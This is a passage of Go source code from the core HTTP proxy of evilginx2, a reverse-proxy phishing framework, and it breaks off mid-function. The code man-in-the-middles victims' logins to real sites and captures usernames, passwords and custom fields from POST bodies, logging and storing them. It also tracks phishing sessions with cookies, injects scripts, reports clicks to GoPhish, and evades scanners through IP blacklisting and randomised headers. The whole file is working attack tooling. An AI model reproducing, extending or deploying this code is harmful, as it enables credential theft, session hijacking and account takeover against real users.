package core

import (
	"bufio"
	"bytes"
	cryptoRand "crypto/rand"
	"crypto/rc4"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
	"github.com/inconshreveable/go-vhost"
	http_dialer "github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	HOME_DIR = ".evilginx"
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second
)

// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	gophish           *GoPhish
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	//	session_mtx       sync.Mutex
}

type ProxySession struct {
	SessionId    string
	Created      bool
	PhishDomain  string
	PhishletName string
	Index        int
}

// set the value of the specified key in the JSON body
func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil, err
	}
	data[key] = value
	newBody, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	return newBody, nil
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		gophish:           NewGoPhish(),
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyConfig.Enabled {
		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
		}
	}

	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:    "",
				Created:      false,
				PhishDomain:  "",
				PhishletName: "",
				Index:        -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// handle ip blacklist
			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]

			// handle proxy headers
			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
			for _, h := range proxyHeaders {
				origin_ip := req.Header.Get(h)
				if origin_ip != "" {
					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
					break
				}
			}

			if p.cfg.GetBlacklistMode() != "off" {
				if p.bl.IsBlacklisted(from_ip) {
					if p.bl.IsVerbose() {
						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
					}
					return p.blockRequest(req)
				}
				if p.cfg.GetBlacklistMode() == "all" {
					if !p.bl.IsWhitelisted(from_ip) {
						err := p.bl.AddIP(from_ip)
						if p.bl.IsVerbose() {
							if err != nil {
								log.Error("blacklist: %s", err)
							} else {
								log.Warning("blacklisted ip address: %s", from_ip)
							}
						}
					}

					return p.blockRequest(req)
				}
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			o_host := req.Host
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}

			pl := p.getPhishletByPhishHost(req.Host)
			remote_addr := from_ip

			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")

			if js_inject_re.MatchString(req.URL.Path) {
				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 3 {
					session_id := ra[1]
					js_id := ra[2]
					if strings.HasSuffix(js_id, ".js") {
						js_id = js_id[:len(js_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							var js_params *map[string]string = nil
							js_params = &s.Params

							script, err := pl.GetScriptInjectById(js_id, js_params)
							if err == nil {
								d_body += script + "\n\n"
							} else {
								log.Warning("js_inject: script not found: '%s'", js_id)
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js_inject: session not found: '%s'", session_id)
						}
					}
				}
			} else if redir_re.MatchString(req.URL.Path) {
				ra := redir_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					if strings.HasSuffix(session_id, ".js") {
						// respond with injected javascript
						session_id = session_id[:len(session_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							if !s.IsDone {
								if s.RedirectURL != "" {
									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
									d_body += dynamic_redirect_js + "\n\n"
								}
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js: session not found: '%s'", session_id)
						}
					} else {
						if _, ok := p.sessions[session_id]; ok {
							redirect_url, ok := p.waitForRedirectUrl(session_id)
							if ok {
								type ResponseRedirectUrl struct {
									RedirectUrl string `json:"redirect_url"`
								}
								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
								if err == nil {
									s_index, _ := p.sids[session_id]
									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
									return req, resp
								}
							}
							resp := goproxy.NewResponse(req, "application/json", 408, "")
							return req, resp
						} else {
							log.Warning("api: session not found: '%s'", session_id)
						}
					}
				}
			}

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
					ps.PhishletName = pl_name
				}
				session_cookie := getSessionCookieName(pl_name, p.cookieName)

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						log.Debug("triggered lure for path '%s'", req_path)
					}

					var create_session bool = true
					var ok bool = false
					sc, err := req.Cookie(session_cookie)
					if err == nil {
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							create_session = false
							ps.SessionId = sc.Value
							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
						} else {
							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
							// not a lure path and IP is whitelisted

							// TODO: allow only retrieval of static content, without setting session ID

							create_session = false
							req_ok = true
							/*
								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
								if ok {
									create_session = false
									ps.Index, ok = p.sids[ps.SessionId]
								} else {
									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
								}*/
						}
					}

					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
						// session cookie not found
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								// check if lure is not paused
								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
									return p.blockRequest(req)
								}

								// check if lure user-agent filter is triggered
								if len(l.UserAgentFilter) > 0 {
									re, err := regexp.Compile(l.UserAgentFilter)
									if err == nil {
										if !re.MatchString(req.UserAgent()) {
											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

											if p.cfg.GetBlacklistMode() == "unauth" {
												if !p.bl.IsWhitelisted(from_ip) {
													err := p.bl.AddIP(from_ip)
													if p.bl.IsVerbose() {
														if err != nil {
															log.Error("blacklist: %s", err)
														} else {
															log.Warning("blacklisted ip address: %s", from_ip)
														}
													}
												}
											}
											return p.blockRequest(req)
										}
									} else {
										log.Error("lures: user-agent filter regexp is invalid: %v", err)
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									// set params from url arguments
									p.extractParams(session, req.URL)

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										if trackParam, ok := session.Params["o"]; ok {
											if trackParam == "track" {
												// gophish email tracker image
												rid, ok := session.Params["rid"]
												if ok && rid != "" {
													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
													if err != nil {
														log.Error("gophish: %s", err)
													}
													return p.trackerImage(req)
												}
											}
										}
									}

									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										rid, ok := session.Params["rid"]
										if ok && rid != "" {
											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
											if err != nil {
												log.Error("gophish: %s", err)
											}
										}
									}

									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									session.RemoteAddr = remote_addr
									session.UserAgent = req.Header.Get("User-Agent")
									session.RedirectURL = pl.RedirectUrl
									if l.RedirectUrl != "" {
										session.RedirectURL = l.RedirectUrl
									}
									if session.RedirectURL != "" {
										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
									}
									session.PhishLure = l
									log.Debug("redirect URL (lure): %s", session.RedirectURL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

								if p.cfg.GetBlacklistMode() == "unauth" {
									if !p.bl.IsWhitelisted(from_ip) {
										err := p.bl.AddIP(from_ip)
										if p.bl.IsVerbose() {
											if err != nil {
												log.Error("blacklist: %s", err)
											} else {
												log.Warning("blacklisted ip address: %s", from_ip)
											}
										}
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}
				req.Header.Set(p.getHomeDir(), o_host)

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
						if err == nil {
							// show html redirector if it is set for the current lure
							if l.Redirector != "" {
								if !p.isForwarderUrl(req.URL) {
									if s.RedirectorName == "" {
										s.RedirectorName = l.Redirector
										s.LureDirPath = req_path
									}

									t_dir := l.Redirector
									if !filepath.IsAbs(t_dir) {
										redirectors_dir := p.cfg.GetRedirectorsDir()
										t_dir = filepath.Join(redirectors_dir, t_dir)
									}

									index_path1 := filepath.Join(t_dir, "index.html")
									index_path2 := filepath.Join(t_dir, "index.htm")
									index_found := ""
									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
										index_found = index_path1
									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
										index_found = index_path2
									}

									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(index_found)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html redirector response")
											}
										} else {
											log.Error("lure: failed to read redirector file: %s", err)
										}

									} else {
										log.Error("lure: redirector file does not exist: %s", index_found)
									}
								}
							}
						} else if s.RedirectorName != "" {
							// session has already triggered a lure redirector - see if there are any files requested by the redirector

							rel_parts := []string{}
							req_path_parts := strings.Split(req_path, "/")
							lure_path_parts := strings.Split(s.LureDirPath, "/")

							for n, dname := range req_path_parts {
								if len(dname) > 0 {
									path_add := true
									if n < len(lure_path_parts) {
										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
										if req_path_parts[n] == lure_path_parts[n] {
											path_add = false
										}
									}
									if path_add {
										rel_parts = append(rel_parts, req_path_parts[n])
									}
								}

							}
							rel_path := filepath.Join(rel_parts...)
							//log.Debug("rel_path: %s", rel_path)

							t_dir := s.RedirectorName
							if !filepath.IsAbs(t_dir) {
								redirectors_dir := p.cfg.GetRedirectorsDir()
								t_dir = filepath.Join(redirectors_dir, t_dir)
							}

							path := filepath.Join(t_dir, rel_path)
							if _, err := os.Stat(path); !os.IsNotExist(err) {
								fdata, err := ioutil.ReadFile(path)
								if err == nil {
									//log.Debug("ext: %s", filepath.Ext(req_path))
									mime_type := getContentType(req_path, fdata)
									//log.Debug("mime_type: %s", mime_type)
									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
									if resp != nil {
										resp.Body = io.NopCloser(bytes.NewReader(fdata))
										return req, resp
									} else {
										log.Error("lure: failed to create redirector data file response")
									}
								} else {
									log.Error("lure: failed to read redirector data file: %s", err)
								}
							} else {
								//log.Warning("lure: template file does not exist: %s", path)
							}
						}
					}
				}

				// Apply randomized headers to make the request look more natural
				GetRandomUserAgent()

				// Add browser-compatible Sec-Fetch headers based on the user agent
				ua := req.Header.Get("User-Agent")
				if strings.Contains(ua, "Chrome") || strings.Contains(ua, "Firefox") {
					req.Header.Set("Sec-Fetch-Mode", "navigate")
					req.Header.Set("Sec-Fetch-Dest", "document")
					req.Header.Set("Sec-Fetch-Site", "none")
					if rand.Intn(100) > 30 {
						req.Header.Set("Sec-Fetch-User", "?1")
					}
				}

				// Occasionally add DNT header
				if rand.Intn(100) > 60 {
					req.Header.Set("DNT", "1")
				}

				// Add varied Accept-Encoding header
				encodings := []string{
					"gzip, deflate, br",
					"gzip, deflate",
					"br, gzip",
				}
				req.Header.Set("Accept-Encoding", encodings[rand.Intn(len(encodings))])

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						u, err := url.Parse(rurl)
						if err == nil {
							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
								if resp != nil {
									resp.Header.Add("Location", rurl)
									return req, resp
								}
							}
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// prevent caching
				req.Header.Set("Cache-Control", "no-cache")

				// fix sec-fetch-dest
				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
				if sec_fetch_dest != "" {
					if sec_fetch_dest == "iframe" {
						req.Header.Set("Sec-Fetch-Dest", "document")
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					req.Header.Set(p.getHomeDir(), o_host)
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")

						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")

						if json_re.MatchString(contentType) {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if um != nil && len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if pm != nil && len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if cm != nil && len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

							// force post json
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											matches := fp_s.key.FindAllString(string(body), -1)
											for _, match := range matches {
												if fp_s.search.MatchString(match) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s", k_matched, match)
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}
									if ok_search {
										for _, fp_f := range fp.force {
											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
											if err != nil {
												log.Debug("force_post: got error: %s", err)
											}
											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
										}
									}
									req.ContentLength = int64(len(body))
									log.Debug("force_post: body: %s len:%d", body, len(body))
								}
							}

						} else if form_re.MatchString(contentType) {

							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
								log.Debug("POST: %s", req.URL.Path)

								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains

									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if cm != nil && len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								for k, v := range req.PostForm {
									for i, vv := range v {
										// patch phishing URLs in POST params with original domains
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
								}

								for k, v := range req.PostForm {
									if len(v) > 0 {
										log.Debug("POST %s = %s", k, v[0])
									}
								}

								body = []byte(req.PostForm.Encode())
								req.ContentLength = int64(len(body))

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				// check if request should be intercepted
				if pl != nil {
					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
						for _, ic := range pl.intercept {
							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
							}
						}
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.Finish(true)
								break
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					// Add entropy to cookie expiration time
					randomMinutes := 45 + rand.Intn(31) // Random between 45-75 minutes
					ck = &http.Cookie{
						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  p.cfg.GetBaseDomain(),
						Expires: time.Now().Add(time.Duration(randomMinutes) * time.Minute),
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
